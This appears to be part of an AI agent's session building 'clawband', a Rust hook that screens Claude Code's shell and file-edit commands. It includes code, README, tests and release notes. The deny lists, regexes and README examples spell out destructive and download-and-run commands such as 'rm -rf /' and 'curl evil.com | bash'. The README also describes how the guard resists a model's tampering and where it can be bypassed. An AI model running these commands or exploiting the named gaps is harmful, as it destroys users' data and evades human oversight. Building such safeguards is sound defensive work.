1243	    println!("  ask.patterns     {}", file_status(ask_exists, user_ask));
1244	    println!(
1245	        "  allow.patterns   {}",
1246	        file_status(allow_exists, user_allow)
1247	    );
1248

1250	        println!("\n{bold}Project patterns{r}  {d}({}){r}", proj.display());
1251	        let proj_file_status = |name: &str| -> String {
1252	            let path = proj.join(name);

1254	            if n == 0 {
1255	                format!("{d}0 patterns{r}")
1256	            } else {
1257	                format!("{bold}{n}{r} loaded")
1258	            }
1259	        };
1260	        println!("  deny.patterns    {}", proj_file_status("deny.patterns"));
1261	        println!("  ask.patterns     {}", proj_file_status("ask.patterns"));
1262	        println!("  allow.patterns   {}", proj_file_status("allow.patterns"));
1263	    }
1264	
1265	    println!("\n{bold}Active protections{r}");

1267	    println!("  write-then-execute       {g}on{r}  {d}(same-file write+execute in one compound command){r}");

1271	    );

1276	            format!("{g}on{r}")

1297	            "  {b}{}{r}  {d}({}){r}",

1311	            }

1322	// ─── Echo / printf content scanning ──────────────────────────────────────────
1323	// echo and printf are only dangerous when they write content to a script file.
1324	// Piped to screen, a commit message, or a non-script file → always safe.
1325	// Trigger condition: output redirection (> or >>) to a script extension.
1326	
1327	const SCRIPT_EXTS: &str = r"sh|bash|py|js|ts|mjs|rb|pl|lua";
1328	
1329	fn check_echo_to_script(
1330	    segment: &str,
1331	    deny_pats: &[Pattern],
1332	    ask_pats: &[Pattern],
1333	) -> Option<(bool, String)> {
1334	    // Match: echo/printf [-flags] "content"|'content' [>>|>] file.ext
1335	    let re = Regex::new(&format!(
1336	        r#"(?i)^\s*(?:echo|printf)(?:\s+-[a-zA-Z]+)*\s+(?:"([^"]*)"|'([^']*)')\s*>>?\s*\S+\.(?:{SCRIPT_EXTS})\b"#
1337	    ))
1338	    .unwrap();
1339	    let caps = re.captures(segment)?;
1340	    let content = caps.get(1).or(caps.get(2))?.as_str();
1341	
1342	    for pat in deny_pats {
1343	        if pat.matches(content) {
1344	            return Some((
1345	                true,
1346	                format!(
1347	                    "Blocked: '{}' found in echo content written to script file: {}",
1348	                    pat.label, content
1349	                ),
1350	            ));
1351	        }
1352	    }
1353	    for pat in ask_pats {
1354	        if pat.matches(content) {
1355	            return Some((
1356	                false,
1357	                format!(
1358	                    "Review before running — '{}' found in echo content written to script file: {}\nTo always allow: clawband allow '{}'",
1359	                    pat.label, content, pat.label
1360	                ),
1361	            ));
1362	        }
1363	    }
1364	    None
1365	}
1366	
1367	// ─── Write-then-execute detection ─────────────────────────────────────────────
1368	// If a compound command writes a file AND later executes that same file,
1369	// the content can't be scanned before execution. Matches by basename so
1370	// extension doesn't matter — `echo bad > run.txt; bash run.txt` is caught too.
1371	
1372	fn check_write_then_execute(segments: &[String]) -> bool {
1373	    if segments.len() < 2 {
1374	        return false;
1375	    }
1376	    // Capture the filename after any output redirection operator
1377	    let write_re = Regex::new(r">>?\s*(\S+)").unwrap();
1378	    // Capture the filename passed to an interpreter or run directly
1379	    let exec_re = Regex::new(
1380	        r"(?i)(?:\b(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua)\s+<?|^\s*(?:sudo\s+)?\./)(\S+)",
1381	    )
1382	    .unwrap();
1383	
1384	    let written: Vec<&str> = segments
1385	        .iter()
1386	        .flat_map(|s| write_re.captures_iter(s))
1387	        .filter_map(|c| c.get(1).map(|m| path_basename(m.as_str())))
1388	        .collect();
1389	
1390	    if written.is_empty() {
1391	        return false;
1392	    }
1393	
1394	    segments.iter().any(|s| {
1395	        exec_re.captures_iter(s).any(|c| {
1396	            c.get(1)
1397	                .map(|m| written.contains(&path_basename(m.as_str())))
1398	                .unwrap_or(false)
1399	        })
1400	    })
1401	}
1402	
1403	// ─── Subshell content scanning ────────────────────────────────────────────────
1404	// Rather than flagging every $() as ask, extract inner commands and evaluate them.
1405	// Returns None (pass) when all subshells are clean — eliminates false positives
1406	// like `git commit -F $(mktemp)` or `BRANCH=$(git branch --show-current)`.
1407	
1408	fn check_subshells(
1409	    command: &str,
1410	    deny_pats: &[Pattern],
1411	    ask_pats: &[Pattern],
1412	    allow_pats: &[Pattern],
1413	) -> Option<(&'static str, String)> {
1414	    if !command.contains("$(") && !command.contains('`') {
1415	        return None;
1416	    }
1417	
1418	    // If the command itself IS a subshell ($(...) or `...` as the command, not an
1419	    // argument), the output becomes the next command — we can't know what it'll be.
1420	    let trimmed = command.trim();
1421	    if trimmed.starts_with("$(") || trimmed.starts_with('`') {
1422	        return Some((
1423	            "ask",
1424	            "Command is a subshell — its output will be executed directly. \
1425	             Review before running."
1426	                .to_string(),
1427	        ));
1428	    }
1429	
1430	    // Extract first-level $(...) and `...` content
1431	    let dp_re = Regex::new(r"\$\(([^()]*)\)").unwrap();
1432	    let bt_re = Regex::new(r"`([^`]*)`").unwrap();
1433	
1434	    let inner_cmds: Vec<String> = dp_re
1435	        .captures_iter(command)
1436	        .map(|c| c[1].trim().to_string())
1437	        .chain(
1438	            bt_re
1439	                .captures_iter(command)
1440	                .map(|c| c[1].trim().to_string()),
1441	        )
1442	        .filter(|s| !s.is_empty())
1443	        .collect();
1444	
1445	    // Check if any $( or ` remains after removing extracted subshells (nested case)
1446	    let stripped = dp_re.replace_all(command, "");
1447	    let stripped = bt_re.replace_all(&stripped, "");
1448	    let has_residual = stripped.contains("$(") || stripped.contains('`');
1449	
1450	    // Evaluate each inner command — deny beats ask
1451	    let mut worst_ask: Option<String> = None;
1452	    for inner in &inner_cmds {
1453	        if let Some((decision, reason)) = check_command(inner, deny_pats, ask_pats, allow_pats) {
1454	            if decision == "deny" {
1455	                return Some((
1456	                    "deny",
1457	                    format!("Subshell contains blocked command — {}", reason),
1458	                ));
1459	            }
1460	            if worst_ask.is_none() {
1461	                worst_ask = Some(format!("Subshell contains risky command — {}", reason));
1462	            }
1463	        }
1464	    }
1465	
1466	    if let Some(reason) = worst_ask {
1467	        return Some(("ask", reason));
1468	    }
1469	
1470	    // Inner commands are clean but nested subshells can't be fully evaluated
1471	    if has_residual {
1472	        return Some((
1473	            "ask",
1474	            "Command contains nested subshell — review before running.".to_string(),
1475	        ));
1476	    }
1477	
1478	    // All subshells extracted and clean — pass through
1479	    None
1480	}
1481	
1482	// ─── Core check logic ────────────────────────────────────────────────────────
1483	// Returns Some(("deny"|"ask", reason)) or None for pass.
1484	// Does NOT perform script-file scanning (requires filesystem) or subshell checks.
1485	
1486	fn check_command<'a>(
1487	    command: &str,
1488	    deny_pats: &'a [Pattern],
1489	    ask_pats: &'a [Pattern],
1490	    allow_pats: &'a [Pattern],
1491	) -> Option<(&'a str, String)> {
1492	    let clean = strip_safe_pipes(command);
1493	    let segments = split_segments(&clean);
1494	
1495	    for segment in &segments {
1496	        if allow_pats.iter().any(|p| p.matches(segment)) {
1497	            continue;
1498	        }
1499	
1500	        if let Some(reason) = check_force_push(segment) {
1501	            return Some(("deny", reason));
1502	        }
1503	
1504	        for pat in deny_pats {
1505	            if pat.matches(segment) {
1506	                return Some((
1507	                    "deny",
1508	                    format!("Blocked: '{}' matched in: {}", pat.label, segment),
1509	                ));
1510	            }
1511	        }

2061	    // ── scan_script_file integration tests ────────────────────────────────────
2062	    // Write real temp files and verify the scanner catches dangerous content.
2063	
2064	    // Use unique per-test paths to avoid parallel-test race conditions
2065	    fn scan_content(name: &str, ext: &str, content: &str) -> Option<String> {
2066	        let path = format!("/tmp/clawband_test_{}_{}.{}", std::process::id(), name, ext);
2067	        fs::write(&path, content).unwrap();
2068	        let result =
2069	            scan_script_file(&path, &deny_pats(), &ask_pats(), &no_allow()).map(|(d, _)| d);
2070	        let _ = fs::remove_file(&path);
2071	        result
2072	    }

2183	    fn register_hook_self_heals_duplicate_clawband_sections() {

2185	        let mut s = serde_json::json!({
2186	            "hooks": {

2192	                    ]}
2193	                ]

2197	        let count: usize = s["hooks"]["PreToolUse"]
2198	            .as_array()
2199	            .unwrap()
2200	            .iter()
2201	            .flat_map(|e| e["hooks"].as_array().cloned().unwrap_or_default())
2202	            .filter(|h| h["command"].as_str().is_some_and(is_clawband_main_command))

2206	            .as_array()
2207	            .unwrap()
2208	            .iter()
2209	            .flat_map(|e| e["hooks"].as_array().cloned().unwrap_or_default())

2211	        assert!(icm);
2212	    }

2266	    // ── self-protect: edit_protected helper ───────────────────────────────────
2267	
2268	    fn make_protect_pats(raw_lines: &[&str]) -> Vec<Pattern> {
2269	        raw_lines
2270	            .iter()
2271	            .filter_map(|l| {
2272	                let expanded = if l.starts_with("~/") {
2273	                    // In tests we don't have a real HOME — substitute a fixed prefix
2274	                    format!("/home/testuser/{}", &l[2..])
2275	                } else {
2276	                    l.to_string()
2277	                };
2278	                Pattern::from_user(&expanded)
2279	            })
2280	            .collect()
2281	    }
2282

2497	        // Total entries = 2
2498	        assert_eq!(s["hooks"]["PreToolUse"].as_array().unwrap().len(), 2);

```text
1	# clawband
2	
3	A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.
4	
5	Written in Rust: single binary, sub-millisecond execution, proper regex engine.
6	
7	## What it does
8	
9	Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:
10	
11	- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
12	- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
13	- **Loads user-defined pattern files** so you can customise behaviour without touching the binary
14	
15	### Why compound-command splitting matters
16	
17	A naive check on the full command string misses chained attacks like:
18	
19	```sh
20	ls -la && rm -rf /
21	```
22	
23	clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.
24	
25	Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.
26	
27	### Script file scanning
28	
29	When a command runs a script file (`bash foo.sh`, `python3 script.py`, `ruby app.rb`, `./run.sh`, `bash < input.sh`), clawband reads the file and checks each line against deny/ask patterns before execution. Supported interpreters: `bash`, `sh`, `zsh`, `dash`, `python3`, `node`, `deno`, `perl`, `ruby`, `lua`.
30	
31	### Write-then-execute detection
32	
33	If a compound command **writes** to a file and **executes that same file** in one invocation, the content can't be scanned before it runs. clawband catches this regardless of file extension:
34	
35	```sh
36	echo "..." > run.sh && bash run.sh   # ask — same file written and executed
37	curl url > run.txt; bash run.txt      # ask — extension doesn't matter
38	echo "..." > other.sh && bash run.sh  # pass — different files
39	```
40	
41	### Echo/printf content scanning
42	
43	`echo` and `printf` are only dangerous when redirecting to a script file. clawband extracts the quoted content and checks it against patterns:
44	
45	```sh
46	echo "rm -rf /" > bad.sh   # deny — dangerous content in script file
47	echo "hello" > log.txt     # pass — not a script file
48	echo "hello world"          # pass — no redirection
49	```
50	
51	### Attribution
52	
53	Every block or prompt message is prefixed with `[clawband]` so you can always tell the source — distinguishable from Claude Code's built-in deny list and Claude's own safety judgment.
54	
55	## Installation
56	
57	Requires `jq`. Rust is only needed if no pre-built binary is available for your platform.
58	
59	```sh
60	bash install.sh
61	```
62	
63	The installer downloads the latest pre-built binary for your platform (Linux x86_64, macOS arm64, macOS x86_64) and falls back to `cargo build` if none is available. It installs the binary to `~/.claude/hooks/clawband`, creates `~/.clawband/` config files, and wires up `~/.claude/settings.json`. Then run `/hooks` in Claude Code (or restart) to activate.
64	
65	### Homebrew
66	
67	```sh
68	brew install jamessoubry/clawband/clawband
69	clawband install   # wires the hook into ~/.claude/settings.json + seeds config
70	clawband verify    # confirm it's active
71	```
72	
73	Homebrew installs the `clawband` binary onto your `PATH` but does **not** wire it into Claude Code. `clawband install` does that step (creates `~/.clawband/` pattern files and registers the `PreToolUse` hook). Then run `/hooks` in Claude Code (or restart). Upgrade with `brew upgrade clawband`.
74	
75	### Manual installation
76	
77	```sh
78	cargo build --release
79	mkdir -p ~/.claude/hooks
80	cp target/release/clawband ~/.claude/hooks/clawband
81	chmod +x ~/.claude/hooks/clawband
82	```
83	
84	Add to `~/.claude/settings.json`:
85	
86	```json
87	{
88	  "hooks": {
89	    "PreToolUse": [
90	      {
91	        "matcher": "Bash",
92	        "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]
93	      }
94	    ]
95	  }
96	}
97	```
98	
99	## Built-in patterns
100	
101	### Blocked (deny)
102	
103	| Category | Examples |
104	|----------|---------|
105	| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
106	| Silent file emptying | `truncate -s 0` |
107	| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
108	| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
109	| Database destruction | `dropdb` |
110	| Docker destruction | `docker system prune` |
111	| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (with or without space) |
112	| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
113	| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
114	| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
115	| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
116	| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
117	| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |
118	
119	### Prompted (ask)
120	
121	| Category | Examples |
122	|----------|---------|
123	| eval | `eval ` — common in shell init but executes arbitrary strings |
124	| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
125	| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
126	| Remote branch deletion | `git push --delete` |
127	| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
128	| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
129	| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |
130	| npx / npm exec | `npx pkg`, `npm exec -- cmd` — downloads and executes arbitrary npm packages, content can't be scanned |
131	| git push :<branch> | `git push origin :branch` — colon-prefix syntax for remote branch deletion |
132	
133	### Safe patterns preserved
134	
135	- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
136	- `| python3 -m module` — module invocation is allowed
137	- `--force-with-lease` — safe alternative to force push
138	- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator
139	
140	## Custom patterns
141	
142	Extend or override behaviour by editing pattern files. clawband loads two sets:
143	
144	**Global** (`~/.clawband/`) — applied to every project:
145	
146	| File | Effect |
147	|------|--------|
148	| `deny.patterns` | Always block — added to built-in deny list |
149	| `ask.patterns` | Always prompt — added to built-in ask list |
150	| `allow.patterns` | Override any block — matching commands skip all checks |
151	
152	**Project** (`.clawband/` in the current working directory) — loaded in addition to global patterns when the directory exists. Useful for per-repo restrictions or allowances without affecting other projects:
153	
154	| File | Effect |
155	|------|--------|
156	| `.clawband/deny.patterns` | Project-specific blocks |
157	| `.clawband/ask.patterns` | Project-specific prompts |
158	| `.clawband/allow.patterns` | Project-specific overrides |
159	
160	Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.
161	
162	See `deny.patterns.example` and `ask.patterns.example` for the format.
163	
164	```sh
165	# ~/.clawband/deny.patterns — global blocks for all projects
166	my-infra nuke --all
167	
168	# .clawband/allow.patterns — project-specific override
169	git reset --hard HEAD$
170	```
171	
172	## Self-protection
173	
174	By default clawband guards Claude's **Bash** tool. With `--protect` it also guards Claude's **Write/Edit** tools, preventing the model from modifying clawband itself or any other path you list.
175	
176	```sh
177	clawband install --protect
178	```
179	
180	This does three things:
181	
182	1. **Registers a second `PreToolUse` hook** with matcher `Write|Edit|MultiEdit|NotebookEdit`. Every file-edit attempt goes through clawband before it executes.
183	2. **Seeds `~/.clawband/protect.paths`** (if missing) with default protected paths:
184	   - `~/.claude/settings.json` — Claude Code's settings (where hooks are registered)
185	   - `~/.claude/hooks/clawband` — the clawband binary itself
186	   - `~/.clawband/*` — all clawband config files
187	3. **Extends the Bash deny patterns** (when protect.paths is present) to block shell tamper commands: `rm`/`mv`/`shred` referencing clawband files, output redirection (`>`/`>>`) to those files, `sed -i` or `tee` targeting `settings.json`, and `chmod -x` on the hook binary.
188	
189	### What is still allowed
190	
191	- **Your own terminal** is completely unaffected — clawband hooks only fire on Claude Code's tools, never on commands you type yourself.
192	- `brew upgrade clawband`, `brew install ... clawband`, `clawband install`, `bash install.sh` all pass unimpeded.
193	- Any Bash command that does not reference the protected file paths is unchanged.
194	
195	### Customising protect.paths
196	
197	`~/.clawband/protect.paths` is one case-insensitive regex per line. Lines starting with `#` and blank lines are ignored. A leading `~/` is expanded to your home directory at load time.
198	
199	```
200	# ~/.clawband/protect.paths
201	~/.claude/settings\.json$
202	~/.claude/hooks/clawband$
203	~/.clawband/.*
204	# protect a project's production secrets too
205	/etc/myapp/prod\.env$
206	```
207	
208	A project-level `.clawband/protect.paths` (in the current working directory) is loaded in addition to the global file.
209	
210	`clawband verify` reports whether self-protect is active (both protect.paths present and the Write/Edit hook registered).
211	
212	## CLI commands
213	
214	```sh
215	clawband install                      # wire the hook into ~/.claude/settings.json + seed config
216	clawband install --protect            # also enable self-protect (guard clawband files from edits)
217	clawband verify                       # check the hook is registered and the engine works
218	clawband allow '<pattern>'            # append to ~/.clawband/allow.patterns (global)
219	clawband allow --project '<pattern>'  # append to .clawband/allow.patterns (project CWD)
220	clawband deny  '<pattern>'            # append to ~/.clawband/deny.patterns (global)
221	clawband deny  --project '<pattern>'  # append to .clawband/deny.patterns (project CWD)
222	clawband stats                        # show pattern counts and audit log summary
223	clawband --version
224	```
225	
226	`clawband install` is idempotent — it won't duplicate the hook if it's already registered, and it preserves any other hooks (icm, sqz, etc.) already in your settings. `clawband verify` runs a self-test that feeds a known-destructive command through the engine to confirm it actually blocks, and exits non-zero if anything is misconfigured (handy in CI or a dotfiles bootstrap).
227	
228	Patterns are validated as regexes before writing. The install script also adds `/allow` and `/deny` Claude Code slash commands so you can add patterns without leaving the chat.
229	
230	## PostToolUse hook (optional)
231	
232	Install with `--post-hook` to enable in-chat allow suggestions:
233	
234	```sh
235	bash install.sh --post-hook
236	```
237	
238	When you approve a prompted command, the hook tells Claude the command ran and suggests the exact `clawband allow` command to permanently silence that prompt. Uses a breadcrumb file (`~/.clawband/.last-ask`) written at prompt time and consumed on approval — if you deny, PostToolUse never fires and the breadcrumb expires after 60 seconds.
239	
240	## Options
241	
242	Set as environment variables (in your shell profile, or prefixed on the hook command):
243	
244	| Variable | Default | Effect |
245	|----------|---------|--------|
246	| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
247	| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
248	| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
249	| `CLAWBAND_SKIP` | `0` | **Total bypass** — disables *all* checks (see below) |
250	
251	### About `CLAWBAND_SKIP`
252	
253	`CLAWBAND_SKIP=1` is a complete bypass: clawband exits immediately and the command runs with no checks at all — deny patterns included. It does **not** downgrade blocks to prompts; it skips everything.
254	
255	Crucially, clawband reads this variable from **its own process environment**, *not* from the command string. That means a model cannot bypass the guard by prefixing a command:
256	
257	```sh
258	CLAWBAND_SKIP=1 rm -rf /     # STILL BLOCKED — the prefix is just text in the
259	                             # command string; rm -rf / still matches
260	```
261	
262	The variable only takes effect when it is actually exported into the hook's environment. The safe, intended use is a one-off inline prefix on a **trusted wrapper you invoke yourself**, where it applies to that single invocation.
263	
264	⚠️ **Footgun:** if you `export CLAWBAND_SKIP=1` globally (shell profile or Claude Code `settings.json` `env` block), clawband is silently disabled for the entire session. `clawband stats` shows a red **ALL CHECKS DISABLED** warning when it detects this, and (with `CLAWBAND_LOG=1`) every bypassed command is recorded as a `SKIP` event in `~/.clawband.log`.
265	
266	## Requirements
267	
268	- `bash install.sh`: `jq` (always), Rust toolchain (`cargo`) only if no pre-built binary is available for your platform
269	- Runtime: none (single static binary)
270	
271	## Limitations
272	
273	- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split. The hook asks for confirmation rather than hard-blocking.
274	- **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
275	- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
276	- **`git push :<branch>` deletion** — the colon-prefix syntax for remote branch deletion is not blocked; use `--delete` instead.
277	- **Commit messages containing blocked patterns** — if a commit message itself contains a pattern like `rm -rf /` (e.g. documenting a fix), clawband will block the `git commit` command. Workaround: write the message to a temp file and use `git commit -F /tmp/msg.txt`, or rephrase to avoid the literal pattern.
278	
279	## Contributing
280	
281	Found a destructive command clawband misses? Open a [New pattern issue](https://github.com/jamessoubry/clawband/issues/new?template=new-pattern.md) (no Rust needed) or add it yourself — patterns live in `src/main.rs` in `builtin_deny()` and `builtin_ask()`. See [CONTRIBUTING.md](CONTRIBUTING.md) for the pattern recipe, guidelines, and dev setup.
282	
283	## Licence
284	
285	MIT
286
```

feat: symlink hardening, obfuscation ask patterns, test/patterns subcommands (v2.18.0)

Four hardening and tooling improvements:

1. Symlink hardening for Write/Edit self-protect guard: the edit-path check now
   calls std::fs::canonicalize to resolve symlinks and ".." components before
   matching against protect.paths. For paths that don't exist yet, the parent
   directory is canonicalized and the filename re-appended. Both the original
   and canonicalized paths are tested so a symlinked bypass is blocked.

2. base64 / obfuscation ask patterns: four new builtin_ask() entries flag
   decoding obfuscated content before execution or persistence — base64 -d piped
   or redirected, xxd -r piped or redirected, and openssl base64/enc -d. Plain
   encode (no decode flag) continues to pass. Pipe-to-interpreter after decode
   (e.g. base64 -d | bash) remains DENY because the deny check runs first.

3. clawband test '<command>' subcommand: dry-runs the full pattern stack and
   prints a coloured DENY/ASK/PASS with the matched reason. Loads the same
   builtin + global + project + self-protect patterns as the live hook. Useful
   for authoring patterns and debugging false positives.

4. clawband patterns subcommand: lists every active pattern grouped by source —
   built-in deny/ask (with counts), user global deny/ask/allow, project
   deny/ask/allow, and self-protect paths + tamper-guard count. Makes the full
   enforcement surface auditable at a glance.

Help text and README updated; 99 tests pass.

All done. Here is the summary:

**99 tests pass. All checks pass. Branch pushed.**

---

### What was implemented

**1. Symlink hardening (`edit_candidates` helper)**

The Write/Edit guard now calls `edit_candidates(abs_path)` which returns up to two paths: the original expanded-absolute path and the `fs::canonicalize`-resolved path. For files that don't exist yet (new file creation), the parent directory is canonicalized and the filename re-appended. All candidates are checked against `protect_patterns()` so a symlink pointing into a protected path cannot bypass the guard. The pure `edit_protected` function is unchanged; the symlink resolution happens in a separate, FS-touching layer.

**2. Base64 / obfuscation `ask` patterns**

Four new entries in `builtin_ask()`:
- `base64 decode piped` — `base64 -d/-D/--decode … |`
- `base64 decode redirect` — `base64 -d/-D/--decode … >`
- `xxd reverse` — `xxd -r … (| or >)`
- `openssl base64 decode` — `openssl … (base64 -d | enc -d)`

Plain `base64 file.txt` (encode) passes. `base64 -d | bash` remains DENY because deny is checked before ask. 14 new tests cover the patterns.

**3. `clawband test '<command>'`**

New `cmd_test()` function dispatched from `Some("test")`. Loads the full live pattern stack (builtin + global + project + self-protect), runs `check_command`, and prints a coloured `DENY` / `ASK` / `PASS` with the reason. No-arg invocation prints usage and exits 1.

**4. `clawband patterns`**

New `cmd_patterns()` function dispatched from `Some("patterns")`. Prints patterns grouped with headers and counts: built-in deny, built-in ask, user global, project, and self-protect (paths + tamper-guard count).

**Files changed:** `/home/ubuntu/clawband/src/main.rs`, `/home/ubuntu/clawband/Cargo.toml` (2.17.0 → 2.18.0), `/home/ubuntu/clawband/Cargo.lock`, `/home/ubuntu/clawband/README.md`

```md
## Summary

v2.18.0 — security hardening + author/debug tooling. Four changes:

### 1. Symlink hardening for `--protect` (security)
The Write/Edit self-protect guard matched the literal `file_path`, so a symlink pointing into a protected path could bypass it. Now each edit target is also `canonicalize`d (symlinks + `..` resolved; for not-yet-existing files the parent dir is canonicalized and the name re-appended), and **both** the resolved and canonical paths are checked. Verified: editing a protected file *through a symlink* is now denied; unrelated symlinks still pass.

### 2. base64 / obfuscation `ask` patterns
clawband can't inspect already-encoded payloads, so decoding-for-execution/persistence is now flagged for review:
- `base64 -d`/`--decode` piped or redirected
- `xxd -r` piped or redirected
- `openssl base64 -d` / `enc -d`

`base64 -d … | bash` stays **deny** (deny beats ask); plain `base64 file` (encode) passes.

### 3. `clawband test '<command>'` (dry-run)
Prints what clawband *would* decide — `DENY`/`ASK`/`PASS` + reason — without running anything. For pattern authors and debugging false positives. Loads the full live stack (built-in + global + project + self-protect).

### 4. `clawband patterns`
Lists every active pattern grouped with counts: built-in deny/ask, user, project, and self-protect status + protected paths.

## Verified
99 tests (clippy + fmt clean). Behaviorally tested the release binary: `test` (deny/ask/pass), `patterns`, and the symlink-bypass denial all correct.

🤖 Generated with [Claude Code](https://claude.com/claude-code)

```

```rs
//! End-to-end tests: pipe real Claude Code hook JSON through the built binary
//! and assert on the decision. These catch tool-routing regressions (Bash vs
//! Write/Edit) and JSON I/O bugs that unit tests of `check_command` can't.

use std::io::Write;
use std::process::{Command, Stdio};

/// Run the built clawband binary with `stdin`, returning (stdout, exit_ok).
/// Optional env overrides are applied (e.g. CLAWBAND_SKIP, HOME).
fn run(stdin: &str, env: &[(&str, &str)]) -> String {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_clawband"));
    cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::null());
    // Neutralise ambient config so tests are deterministic regardless of the
    // machine's real ~/.clawband or env.
    cmd.env_remove("CLAWBAND_SKIP")
        .env_remove("RTK_ENABLED")
        .env_remove("SQZ_ENABLED")
        .env_remove("CLAWBAND_LOG");
    cmd.env("HOME", "/nonexistent-clawband-test-home");
    for (k, v) in env {
        cmd.env(k, v);
    }
    let mut child = cmd.spawn().expect("spawn clawband");
    child
        .stdin
        .take()
        .unwrap()
        .write_all(stdin.as_bytes())
        .unwrap();
    let out = child.wait_with_output().expect("wait clawband");
    String::from_utf8_lossy(&out.stdout).into_owned()
}

fn decision(stdout: &str) -> Option<&'static str> {
    if stdout.contains("\"permissionDecision\":\"deny\"") {
        Some("deny")
    } else if stdout.contains("\"permissionDecision\":\"ask\"") {
        Some("ask")
    } else {
        None // empty output = pass
    }
}

fn bash(command: &str) -> String {
    format!(r#"{{"tool_name":"Bash","tool_input":{{"command":{:?}}}}}"#, command)
}

#[test]
fn e2e_blocks_destructive_bash() {
    let out = run(&bash("docker system prune"), &[]);
    assert_eq!(decision(&out), Some("deny"));
    // attribution prefix is present in the reason
    assert!(out.contains("[clawband]"), "reason should be prefixed: {out}");
}

#[test]
fn e2e_compound_command_caught() {
    let out = run(&bash("ls -la && git push --force"), &[]);
    assert_eq!(decision(&out), Some("deny"));
}

#[test]
fn e2e_safe_command_passes() {
    let out = run(&bash("ls -la"), &[]);
    assert_eq!(decision(&out), None);
}

#[test]
fn e2e_ask_command() {
    let out = run(&bash("git reset --hard HEAD~1"), &[]);
    assert_eq!(decision(&out), Some("ask"));
}

#[test]
fn e2e_skip_bypasses_everything() {
    let out = run(&bash("docker system prune"), &[("CLAWBAND_SKIP", "1")]);
    assert_eq!(decision(&out), None, "CLAWBAND_SKIP=1 should bypass");
}

#[test]
fn e2e_non_bash_tool_without_protect_is_noop() {
    // Write tool, no protect.paths in the test HOME -> no decision (allow).
    let json = r#"{"tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}"#;
    let out = run(json, &[]);
    assert_eq!(decision(&out), None);
}

#[test]
fn e2e_malformed_json_is_safe_noop() {
    // Garbage stdin must not crash or emit a decision.
    let out = run("not json at all", &[]);
    assert_eq!(decision(&out), None);
}

#[test]
fn e2e_version_flag() {
    let out = run("", &[]); // stdin unused for --version path; invoke separately
    let _ = out;
    let v = Command::new(env!("CARGO_BIN_EXE_clawband"))
        .arg("--version")
        .output()
        .expect("run --version");
    let s = String::from_utf8_lossy(&v.stdout);
    assert!(s.starts_with("clawband v"), "got: {s}");
}

```

```text
225:clawband stats                        # show pattern counts and audit log summary
226:clawband test '<command>'             # dry-run: print DENY/ASK/PASS without executing
227:clawband patterns                     # list all active patterns (built-in + user + project)
228:clawband --version
231:`clawband test` is useful when authoring custom patterns or debugging false positives. It loads the same pattern set the live hook uses (built-in + global + project + self-protect patterns) and prints a coloured `DENY`, `ASK`, or `PASS` result with the matching reason.
233:`clawband patterns` prints all currently-active patterns grouped by source — built-in deny, built-in ask, user deny/ask/allow, project deny/ask/allow, and self-protect paths — so you can audit exactly what the running hook enforces.
273:⚠️ **Footgun:** if you `export CLAWBAND_SKIP=1` globally (shell profile or Claude Code `settings.json` `env` block), clawband is silently disabled for the entire session. `clawband stats` shows a red **ALL CHECKS DISABLED** warning when it detects this, and (with `CLAWBAND_LOG=1`) every bypassed command is recorded as a `SKIP` event in `~/.clawband.log`.
```
</details></tool-use>

Triage of the three new issues — here's where each fits:

**#42 — `install --post` flag** ✅ *small feature, add directly*
Clean fit: `cmd_install` already handles `--protect`, so adding `--post` (register the `PostToolUse` `clawband post` hook) is a few lines + the same idempotent-registration logic. Genuinely needed now that self-protect blocks manual `settings.json` editing. **Own small PR or bundled.**

**#44 — `allow.patterns` → emit `permissionDecision: "allow"`** ⚠️ *separate PR, behavior change*
